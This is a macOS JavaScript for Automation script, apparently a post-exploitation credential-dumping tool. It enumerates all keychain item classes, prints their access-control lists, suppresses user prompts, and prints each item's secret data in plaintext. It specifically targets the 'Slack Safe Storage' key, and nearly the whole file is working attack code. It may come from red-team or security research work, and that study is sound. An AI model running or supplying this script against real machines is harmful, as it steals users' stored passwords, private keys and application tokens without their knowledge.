ObjC.import("Security");
ObjC.bindFunction('CFMakeCollectable', ['id', ['void *'] ]);

let DEBUG = true;

function debug(message) {
    if (DEBUG) {
        console.log("[DEBUG] " + message);
    }
}

function hex2a(hexx) {
    debug("Entering hex2a function");
    var hex = hexx.toString();//force conversion
    var str = '';
    for (var i = 0; i < hex.length; i += 2)
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    debug("Exiting hex2a function");
    return str;
}

print_acls = function(accessRights, acl_c, range, keychainItem){
    debug("Entering print_acls function");
    let userId = Ref();
    let groupId = Ref();
    let ownerType = Ref();
    let ownerACLS = Ref();
    
    let status = $.SecAccessCopyOwnerAndACL(accessRights, userId, groupId, ownerType, ownerACLS);
    if (status !== 0) {
        console.log("Failed to copy owner and ACL. Error: " + status);
        return;
    }

    if(ownerType[0] !== 0){
        console.log("userid: " + userId[0] + "\ngroupid: " + groupId[0] + "\nownertype: " + ownerType[0]);
    } else {
        console.log("\tOwnership determined by partitionID");
    }
    
    let auth_c = $.CFMakeCollectable(ownerACLS[0]);
    if(auth_c && typeof auth_c.js !== 'undefined'){
        console.log("Owner Authorizations:");
        let authCount = $.CFArrayGetCount(auth_c);
        for(let j = 0; j < authCount; j++){
            let authz = auth_c.objectAtIndex(j);
            console.log("\t" + ObjC.unwrap(authz));
        }
    } else {
        console.log("\tNo Authorizations");
    }
    
    for(let i = 0; i < range; i++){
        let acl1 = acl_c.objectAtIndex(i);
        let application_list = Ref();
        let description = Ref();
        let keychainPromptSelector = Ref();
        
        status = $.SecACLCopyContents(acl1, application_list, description, keychainPromptSelector);
        if (status !== 0) {
            console.log("Failed to copy ACL contents. Error: " + status);
            continue;
        }

        let description_c = $.CFMakeCollectable(description[0]);
        console.log("---------------------------------------------------");
        console.log("\tDescription of ACL: " + ObjC.unwrap(description_c));
        
        let application_list_c = $.CFMakeCollectable(application_list[0]);
        if(application_list_c && typeof application_list_c.js !== 'undefined'){
            let app_list_length = $.CFArrayGetCount(application_list_c);
            if(app_list_length === 0){
                console.log("\tNo trusted applications");
            } else {
                for(let j = 0; j < app_list_length; j++){
                    let secapp = application_list_c.objectAtIndex(j);
                    let secapp_c = Ref();
                    status = $.SecTrustedApplicationCopyData(secapp, secapp_c);
                    if (status !== 0) {
                        console.log("Failed to copy trusted application data. Error: " + status);
                        continue;
                    }
                    let secapp_data = $.CFMakeCollectable(secapp_c[0]);
                    let sec_string = $.NSString.alloc.initWithDataEncoding(
                        $.NSData.dataWithBytesLength(secapp_data.bytes, secapp_data.length),
                        $.NSUTF8StringEncoding
                    );
                    console.log("\tTrusted App: " + ObjC.unwrap(sec_string));
                }
            }
        } else {
            console.log("\tAll applications trusted");
        }
        
        let auth = $.SecACLCopyAuthorizations(acl1);
        let auth_c = $.CFMakeCollectable(auth);
        if(auth_c && typeof auth_c.js !== 'undefined'){
            console.log("\tAuthorizations:");
            let authCount = $.CFArrayGetCount(auth_c);
            for(let j = 0; j < authCount; j++){
                let authz = auth_c.objectAtIndex(j);
                console.log("\t\t" + ObjC.unwrap(authz));
            }
        } else {
            console.log("\t\tNo Authorizations");
        }
    }
    
    $.SecKeychainSetUserInteractionAllowed(false);
    print_password(keychainItem);
    
    debug("Exiting print_acls function");
}

print_password = function(keychainItem){
    debug("Entering print_password function");
    let dataContent = Ref();
    let dataContentLength = Ref();
    let attributeList = Ref();
    status = $.SecKeychainItemCopyContent(keychainItem, 0, attributeList, dataContentLength, dataContent);
    //console.log(status);
    //console.log(dataContentLength[0]);
    if(status === 0){
        let nsdata = $.NSData.alloc.initWithBytesLength(dataContent[0], dataContentLength[0]);
        //console.log("\t\t[++++++++] SECRET DATA HERE [++++++++++]")
        //console.log("Base64 of secret data: " + nsdata.base64EncodedStringWithOptions(0).js);
        console.log("Secret Data: ", $.NSString.alloc.initWithDataEncoding(nsdata, $.NSUTF8StringEncoding).js);
    }else if(status === -25293){
        console.log("Failed to get password - Invalid Username/Password");
    } else {
        console.log("Failed to decrypt with error: " + status);
    }
    debug("Exiting print_password function");
}

process_query = function(query){
    debug("Entering process_query function");
    debug("Query contents: " + ObjC.deepUnwrap(query));
    
    let items = Ref();
    debug("Created items Ref");
    
    let status = $.SecItemCopyMatching(query, items);
    debug("SecItemCopyMatching status: " + status);
    
    if(status === 0){
        let item_array = ObjC.deepUnwrap($.CFMakeCollectable(items[0]));
        debug("item_array type: " + typeof item_array);
        console.log("[+] Successfully searched, found " + item_array.length + " items")
        for(let i = 0; i < item_array.length; i++){
            debug("Processing item " + (i + 1));
            let item = item_array[i];
            debug("Item keys: " + Object.keys(item).join(", "));
            
            let access_rights2 = Ref();
            debug("Created access_rights2 Ref");
            debug("Calling SecKeychainItemCopyAccess");
            let copyAccessStatus = $.SecKeychainItemCopyAccess(item.objectForKey("v_Ref"), access_rights2);
            debug("SecKeychainItemCopyAccess status: " + copyAccessStatus);
            
            if (copyAccessStatus === 0) {
                let acl2 = Ref();
                debug("Created acl2 Ref");
                debug("Calling SecAccessCopyACLList");
                let copyACLStatus = $.SecAccessCopyACLList(access_rights2[0], acl2);
                debug("SecAccessCopyACLList status: " + copyACLStatus);
                
                if (copyACLStatus === 0) {
                    let range2 = $.CFArrayGetCount(acl2[0]);
                    debug("ACL count: " + range2);
                    let acl_c2 = $.CFMakeCollectable(acl2[0]);
                    debug("ACL CFMakeCollectable result type: " + typeof acl_c2);
                    
                    print_acls(access_rights2[0], acl_c2, range2, item.objectForKey("v_Ref"));
                }
            }
        }
    } else {
        console.log("[-] Failed to search keychain with error: " + status);
    }
    debug("Exiting process_query function");
}

list_all_key_of_type = function(key_type){
	let items = Ref();
	let query = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
    $.CFDictionarySetValue(query, $.kSecClass, key_type);
	$.CFDictionarySetValue(query, $.kSecMatchLimit, $.kSecMatchLimitAll);
	$.CFDictionarySetValue(query, $.kSecReturnAttributes, $.kCFBooleanTrue);
	$.CFDictionarySetValue(query, $.kSecReturnRef, $.kCFBooleanTrue);
	$.CFDictionarySetValue(query, $.kSecReturnData, $.kCFBooleanTrue);
	process_query(query);
}

list_all_attr_of_key_by_account = function(account){
	let items = Ref();
	let query = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
    $.CFDictionarySetValue(query, $.kSecClass, $.kSecClassGenericPassword);
	$.CFDictionarySetValue(query, $.kSecAttrAccount, $.CFStringCreateWithCString($.kCFAllocatorDefault, account, $.kCFStringEncodingUTF8));
	$.CFDictionarySetValue(query, $.kSecMatchLimit, $.kSecMatchLimitAll);
	$.CFDictionarySetValue(query, $.kSecReturnAttributes, $.kCFBooleanTrue);
	$.CFDictionarySetValue(query, $.kSecReturnData, $.kCFBooleanFalse);
	$.CFDictionarySetValue(query, $.kSecReturnRef, $.kCFBooleanTrue);
	process_query(query);
}

list_all_attr_of_key_by_label_genp = function(label){
	let items = Ref();
	let query = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
    $.CFDictionarySetValue(query, $.kSecClass, $.kSecClassGenericPassword);
	$.CFDictionarySetValue(query, $.kSecAttrLabel, $.CFStringCreateWithCString($.kCFAllocatorDefault, label, $.kCFStringEncodingUTF8));
	$.CFDictionarySetValue(query, $.kSecMatchLimit, $.kSecMatchLimitAll);
	$.CFDictionarySetValue(query, $.kSecReturnAttributes, $.kCFBooleanTrue);
	$.CFDictionarySetValue(query, $.kSecReturnData, $.kCFBooleanFalse);
	$.CFDictionarySetValue(query, $.kSecReturnRef, $.kCFBooleanTrue);
	process_query(query);
}

list_all_attr_of_key_by_label_key = function(label){
	let items = Ref();
	let query = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
    $.CFDictionarySetValue(query, $.kSecClass, $.kSecClassKey);
	$.CFDictionarySetValue(query, $.kSecAttrLabel, $.CFStringCreateWithCString($.kCFAllocatorDefault, label, $.kCFStringEncodingUTF8));
	$.CFDictionarySetValue(query, $.kSecMatchLimit, $.kSecMatchLimitAll);
	$.CFDictionarySetValue(query, $.kSecReturnAttributes, $.kCFBooleanTrue);
	$.CFDictionarySetValue(query, $.kSecReturnData, $.kCFBooleanFalse);
	$.CFDictionarySetValue(query, $.kSecReturnRef, $.kCFBooleanTrue);
	process_query(query);
}

list_all_key_of_type($.kSecClassGenericPassword);
list_all_key_of_type($.kSecClassKey);
list_all_key_of_type($.kSecClassInternetPassword);
list_all_key_of_type($.kSecClassCertificate);
list_all_attr_of_key_by_account("test account");
list_all_attr_of_key_by_label_genp("Slack Safe Storage");

function main() {
    debug("Entering main function");
    // ... (rest of the main function)
    debug("Exiting main function");
}

main();
